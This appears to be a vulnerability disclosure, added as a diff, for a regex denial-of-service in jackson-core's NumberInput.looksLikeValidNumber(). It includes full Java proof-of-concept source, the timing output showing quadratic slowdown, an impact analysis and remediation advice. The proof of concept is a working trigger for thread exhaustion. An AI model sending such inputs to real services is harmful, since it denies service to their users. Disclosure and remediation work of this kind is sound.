@@ -1,0 +1,146 @@
+Status
+FULLY REPRODUCED with a clean, textbook empirical signature: measured runtime grew almost
+exactly 4x for every doubling of input size across five consecutive doublings (5,000 → 160,000
+characters), confirming O(n²) behavior. A single 160,000-character string (smaller than a typical
+HTTP request body) took 74.4 seconds for one call to NumberInput.looksLikeValidNumber().
+
+Affected Component / Version
+Package: com.fasterxml.jackson.core:jackson-core
+Confirmed against: jackson-core-2.20.2
+Affected file: src/main/java/com/fasterxml/jackson/core/io/NumberInput.java
+(PATTERN_FLOAT line ~41-42, PATTERN_FLOAT_TRAILING_DOT line ~51, entry point
+looksLikeValidNumber() lines ~646-656)
+Technical Analysis
+private final static Pattern PATTERN_FLOAT = Pattern.compile(
+      "[+-]?[0-9]*[\\.]?[0-9]+([eE][+-]?[0-9]+)?");
+
+private final static Pattern PATTERN_FLOAT_TRAILING_DOT = Pattern.compile(
+        "[+-]?[0-9]+[\\.]");
+
+public static boolean looksLikeValidNumber(final String s) {
+    // ... short-circuits only for null/empty/length==1 ...
+    return PATTERN_FLOAT.matcher(s).matches()
+            || PATTERN_FLOAT_TRAILING_DOT.matcher(s).matches();
+}
+PATTERN_FLOAT contains ambiguous, adjacent quantifiers over the identical character class:
+[0-9]* (optional digits), an optional [.], then [0-9]+ (required digits). Java's
+backtracking Pattern/Matcher engine has no possessive quantifiers or atomic grouping here,
+so on a non-matching input the engine must explore every possible split point between the
+[0-9]* and [0-9]+ groups before concluding failure — the classic quadratic-backtracking
+shape. looksLikeValidNumber() compounds the cost by running a second full-string regex
+(PATTERN_FLOAT_TRAILING_DOT) whenever the first fails, roughly doubling the constant factor
+without changing the asymptotic class.
+
+Critically, the length gate that applies to this specific path is
+StreamReadConstraints.maxStringLength (default 20,000,000), not maxNumberLength
+(default 1,000) — the length ceiling the library uses everywhere else for numeric content.
+This means inputs up to four orders of magnitude larger than the library's own numeric-length
+policy reach this quadratic regex unmodified.
+
+Reproduction Procedure
+Same clone/build steps as jackson-core_1_...md. Then:
+
+CP="build/classes:build/lib/fastdoubleparser-2.0.1.jar"
+javac -cp "$CP" -d poc poc/PoC8_NumberInputReDoS.java
+java -cp "poc:$CP" PoC8_NumberInputReDoS
+Full PoC Source (poc/PoC8_NumberInputReDoS.java)
+import com.fasterxml.jackson.core.io.NumberInput;
+
+public class PoC8_NumberInputReDoS {
+
+    public static void main(String[] args) {
+        int[] sizes = {5_000, 10_000, 20_000, 40_000, 80_000, 160_000};
+        long[] timesMs = new long[sizes.length];
+
+        System.out.println("Timing NumberInput.looksLikeValidNumber(<n ones> + 'x') for growing n:\n");
+
+        for (int i = 0; i < sizes.length; i++) {
+            int n = sizes[i];
+            String s = repeat('1', n) + "x";
+
+            if (i == 0) {
+                NumberInput.looksLikeValidNumber(repeat('1', 200) + "x"); // warm up
+            }
+
+            long t0 = System.nanoTime();
+            boolean result = NumberInput.looksLikeValidNumber(s);
+            long elapsedMs = (System.nanoTime() - t0) / 1_000_000;
+            timesMs[i] = elapsedMs;
+
+            System.out.printf("n=%-8d looksLikeValidNumber=%-6b elapsed=%6d ms%n", n, result, elapsedMs);
+        }
+
+        System.out.println("\nRatio of elapsed time when n doubles (expect ~2x for linear, ~4x for quadratic):");
+        boolean quadraticSignatureObserved = false;
+        for (int i = 1; i < sizes.length; i++) {
+            double ratio = timesMs[i - 1] == 0 ? Double.NaN : (double) timesMs[i] / (double) timesMs[i - 1];
+            System.out.printf("  n=%d -> n=%d : %dms -> %dms  (ratio=%.2fx)%n",
+                    sizes[i - 1], sizes[i], timesMs[i - 1], timesMs[i], ratio);
+            if (ratio >= 3.0) quadraticSignatureObserved = true;
+        }
+
+        System.out.println("\nLargest test (n=" + sizes[sizes.length - 1] + ") took " + timesMs[timesMs.length - 1]
+                + " ms for a single call from ONE HTTP-body-sized string.");
+        System.out.println("\ncom.fasterxml.jackson.core.StreamReadConstraints.DEFAULT_MAX_STRING_LENGTH (20,000,000) "
+                + "governs this path, not maxNumberLength (1,000).");
+
+        if (quadraticSignatureObserved) {
+            System.out.println("\n=> REPRODUCED: superlinear (>=3x per doubling) time growth observed, consistent "
+                    + "with quadratic backtracking in PATTERN_FLOAT on non-matching input.");
+        }
+    }
+
+    static String repeat(char c, int n) {
+        char[] arr = new char[n];
+        java.util.Arrays.fill(arr, c);
+        return new String(arr);
+    }
+}
+Captured Evidence (actual run output)
+Timing NumberInput.looksLikeValidNumber(<n ones> + 'x') for growing n:
+
+n=5000     looksLikeValidNumber=false  elapsed=    74 ms
+n=10000    looksLikeValidNumber=false  elapsed=   306 ms
+n=20000    looksLikeValidNumber=false  elapsed=  1157 ms
+n=40000    looksLikeValidNumber=false  elapsed=  4655 ms
+n=80000    looksLikeValidNumber=false  elapsed= 18592 ms
+n=160000   looksLikeValidNumber=false  elapsed= 74393 ms
+
+Ratio of elapsed time when n doubles (expect ~2x for linear, ~4x for quadratic):
+  n=5000 -> n=10000 : 74ms -> 306ms  (ratio=4.14x)
+  n=10000 -> n=20000 : 306ms -> 1157ms  (ratio=3.78x)
+  n=20000 -> n=40000 : 1157ms -> 4655ms  (ratio=4.02x)
+  n=40000 -> n=80000 : 4655ms -> 18592ms  (ratio=3.99x)
+  n=80000 -> n=160000 : 18592ms -> 74393ms  (ratio=4.00x)
+
+Largest test (n=160000) took 74393 ms for a single call from ONE HTTP-body-sized string.
+
+=> REPRODUCED: superlinear (>=3x per doubling) time growth observed, consistent with quadratic
+backtracking in PATTERN_FLOAT on non-matching input.
+This is an unusually clean empirical result: five consecutive doublings each produced a ratio
+between 3.78x and 4.14x — matching the theoretical O(n²) prediction (ratio = 4.0x) to within
+5% at every single measurement, leaving essentially no ambiguity about the complexity class.
+Extrapolating this measured curve, a ~1MB string (well within common request body limits) would
+take on the order of hours for a single call.
+
+Impact
+Any application that coerces a String-typed JSON field to a number (default jackson-databind
+behavior) is exposed: an attacker who can submit a large numeric-looking string (up to
+maxStringLength's default of 20,000,000 characters — far larger than needed given the
+measured curve) can pin a request-handling thread for an extended period with a single request.
+Because the cost scales quadratically, a handful of concurrent moderately-sized requests
+(tens to low hundreds of KB each) is sufficient to exhaust a typical web server's worker thread
+pool, denying service to all users.
+
+Remediation
+Rewrite PATTERN_FLOAT without quantifier ambiguity using possessive quantifiers, e.g.
+[+-]?(?:[0-9]++(?:\.[0-9]*+)?|\.[0-9]++)(?:[eE][+-]?[0-9]++)?, which also folds in the
+trailing-dot case and removes the need for a second full-string scan.
+Better: replace the regex entirely with a single-pass hand-written character scan — the same
+file already contains exactly this pattern for parseInt, so the library has both the
+precedent and the code style available.
+Apply an independent length limit (maxNumberLength, not the much larger
+maxStringLength) before calling looksLikeValidNumber(), closing the four-orders-of-
+magnitude gap between the two constraints for this specific code path.
+Operationally, until fixed: tighten StreamReadConstraints.maxStringLength well below its
+default, and set wall-clock timeouts on parse/coercion operations.
